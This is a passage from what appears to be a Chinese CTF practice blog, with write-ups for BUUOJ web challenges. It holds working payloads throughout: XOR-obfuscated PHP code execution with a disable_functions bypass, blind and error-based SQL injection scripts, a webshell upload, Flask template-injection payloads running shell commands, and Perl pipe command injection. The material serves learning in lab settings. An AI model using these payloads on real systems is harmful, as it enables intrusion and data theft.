class="language-none">http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193729344.png" alt="image-20210918193729344"></p><p>参考链接</p><p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">bypass_disable_functions | 0xCreed (jxustctf.top)</a></p><p>[<a href="https://www.cnblogs.com/yesec/p/12483631.html">BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过</a></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223822994.png" alt="image-20210918223822994"></p><p>不知道密码，sql注入也不成功</p><p>直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223845191.png" alt="image-20210918223845191"></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注，过滤了空格</p><p>(ascii(substr(database(),{},1))={})&quot;.format(i,j)</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235150704.png" alt="image-20210918235150704"></p><p>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={})</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918234900927.png" alt="image-20210918234900927"></p><p>(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={})</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235644493.png" alt="image-20210918235644493"></p><p>(ascii(substr((select(group_concat(value))from(flag))</p><p>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot;data &#x3D; &#39;&#39;k &#x3D; 0for i in range(13,50):    k &#x3D; 0    for j in range(43,127):        gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        res &#x3D; requests.get(url+gets)        if &quot;your score is: 100&quot; in res.text:            data +&#x3D; chr(j)            print(data)            k &#x3D; 1            break    if(k &#x3D;&#x3D; 0):        print(&quot;err!&quot;)        exit()    </code></pre><p>因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了</p><p>一定是buu flag太长了（</p><p>算是第一次自己写脚本了</p><p>遍历属实跑的太慢了，抽空学一下二分法的写法</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210919002507491.png" alt="image-20210919002507491"></p><p>flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4}</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134432965.png" alt="image-20210921134432965"></p><p>涉及了php的伪随机</p><p>如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的</p><p>查看源码找到check.php</p><pre class="language-php" data-language="php"><code class="language-php">pbEzqyRCJP&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show &#x3D; substr($str, 0, 10);echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);</code></pre><p>知道前几位了</p><p>根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的</p><pre class="language-none"><code class="language-none">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2&#x3D;&#39;ENxxxZwNwR&#39;str3 &#x3D; str1[::-1]length &#x3D; len(str2)res&#x3D;&#39;&#39;for i in range(len(str2)):      for j in range(len(str1)):        if str2[i] &#x3D;&#x3D; str1[j]:            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134815768.png" alt="image-20210921134815768"></p><p>放到php_mt_seed里跑种子</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p><p>再利用这个脚本得到最后的值</p><pre class="language-none"><code class="language-none">&lt;?phpmt_srand(499600072);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;?&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134936468.png" alt="image-20210921134936468"></p><p>吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱</p><p>官网下的爆不出seed，从这里下的可以<a href="https://download.openwall.net/pub/projects/php_mt_seed/">Index of /pub/projects/php_mt_seed (openwall.net)</a></p><p>还有就是一样的种子在php版本不一样的时候出来的值也不一样</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921135243406.png" alt="image-20210921135243406"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;  &lt;&#x2F;head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt;    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot;&gt;    &lt;&#x2F;form&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞</p><p>它会忽略后面的[\x80-\xff]范围内的字符串，即非ascii字符。例子如下：</p><pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.phpphp -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre><p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>源码泄露</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p><p>下载image.php.bak</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>GET方式传入变量id的值，若没有则为1<br>GET方式传入变量path的值，若没有则为空<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\）<br>str_replace()函数将两个变量内的\0、%00、&#39;、&#39;都替换为空<br>将变量$id与$path拼接进SQL语句<br>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\0&#39;&amp;path&#x3D;&quot;payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot;payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;database &#x3D; &quot;&quot;for i in range(1,1000):low &#x3D; 32high &#x3D; 128mid &#x3D; (low + high) &#x2F;&#x2F; 2while(low &lt; high):payload &#x3D; payload4.format(i,mid)new_url &#x3D; url + payloadr &#x3D; requests.get(new_url)if &quot;JFIF&quot; in r.text:low &#x3D; mid + 1else:high &#x3D; midmid &#x3D; (low + high) &#x2F;&#x2F; 2if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128):breakdatabase +&#x3D; chr(mid)print(database)</code></pre><p>得到密码和用户名登录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180732197.png" alt="image-20211021180732197"></p><p>登录后是个文件上传的页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180749445.png" alt="image-20211021180749445"></p><p>这里要用文件名传一句话木马</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184513558.png" alt="image-20211021184513558"></p><p>在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184345858.png" alt="image-20211021184345858"></p><p>不能用php就用短标签代替</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184319466.png" alt="image-20211021184319466"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184415617.png" alt="image-20211021184415617"></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>第一次遇见二次注入的题，正好学一下</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234512946.png" alt="image-20211026234512946"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234523294.png" alt="image-20211026234523294"></p><p>源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码</p><p>change.php页面</p><pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg &#x3D; &#39;&#39;;    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;    $user_name &#x3D; $_POST[&quot;user_name&quot;];    $address &#x3D; addslashes($_POST[&quot;address&quot;]);    $phone &#x3D; $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg &#x3D; &#39;no sql inject!&#39;;    &#125;else&#123;        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;        $fetch &#x3D; $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row &#x3D; $fetch-&gt;fetch_assoc();        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];        $result &#x3D; $db-&gt;query($sql);        if(!$result) &#123;            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        &#125;        $msg &#x3D; &quot;订单修改成功&quot;;    &#125; else &#123;        $msg &#x3D; &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg &#x3D; &quot;信息不全&quot;;&#125;</code></pre><p>主要的漏洞点就在change.php</p><p>因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address</p><p>在创建address时虽然对输入的数据进行了addslashes过滤</p><p>但之后还会对旧address进行一次sql查询</p><p>因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件</p><p>在创建时在地址中输入注入语句</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p><p>（这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000523555.png" alt="image-20211027000523555"></p><p>在修改地址的时候就会重新调用这个sql语句，报错输出flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000543438.png" alt="image-20211027000543438"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>一眼ssti，然后就不会了（</p><p>f12看到源码注释，get方式，参数为search</p><p>试一下传49确定是ssti</p><pre class="language-none"><code class="language-none">config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。&#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; 查看配置项目的信息  </code></pre><p>例一：<br>warnings.catch_warnings类</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-none"><code class="language-none">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,</code></pre><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>这也是个二次注入</p><p>注册后登录再修改密码</p><p>利用报错注入</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162141941.png" alt="image-20211028162141941"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162259138.png" alt="image-20211028162259138"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p><p>离谱，被骗了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028163357632.png" alt="image-20211028163357632"></p><p>重新查表</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170524356.png" alt="image-20211028170524356"></p><p>这一看就是没输出全</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170804487.png" alt="image-20211028170804487"></p><p>？？？</p><p>这个字段里加了一堆没用的数据</p><p>只能用正则regexp过滤一下</p><p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171620967.png" alt="image-20211028171620967"></p><p>还是没输出全</p><p>之后就要用逆序输出了</p><p>ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171750860.png" alt="image-20211028171750860"></p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>进去后是php代码</p><p>直接抄的其他师傅的注释</p><pre class="language-none"><code class="language-none">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);  &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。     @mkdir($sandbox);    @chdir($sandbox);     &#x2F;&#x2F; 改变当前的目录到$sandbox    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);  &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);    &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</code></pre><p>简单来说就是利用传参中的url执行命令，然后将结果保存在filename中</p><p>有几个地方不太懂</p><p>​    1.百度的wp都说这里利用的perl脚本里的open漏洞</p><pre class="language-none"><code class="language-none">利用GET中的open函数漏洞。open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.翻译过来意思是perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</code></pre><p>​    2.这里执行url传入的命令的前提是要求有个以该命令命名的文件</p><p>?url=/&amp;filename=1.txt 看一下根目录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205139421.png" alt="image-20211103205139421"></p><p>有两个和flag有关的文件，试flag无果，只能试试readflag</p><p>?url=&amp;filename=bash -c /readflag|</p><p>先创建一个bash -c /readflag|的文件</p><p>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</p><p>利用url执行命令</p><p>/sandbox/md5值/bash -c /readflag|</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205748482.png" alt="image-20211103205748482"></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002530209.png" alt="image-20211115002530209"></p><p>json格式</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002559767.png" alt="image-20211115002559767"></p><p>cmd</p><p>可以猜到执行命令格式是</p><p>{&quot;cmd&quot;:&quot;ls&quot;}</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p><p>还可以直接get参数进去</p><p>但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤</p><pre><code>&lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径：if (isset($_REQUEST[&#39;cmd&#39;])) &#123;    $json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125; else &#123;    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;    $cmd = json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !== NULL) &#123;        system($cmd);    &#125; else &#123;        echo &#39;Invalid input&#39;;    &#125;    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;&#125;&#125;?&gt;</code></pre><p>cat命令不能用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径：</p><blockquote><p><a 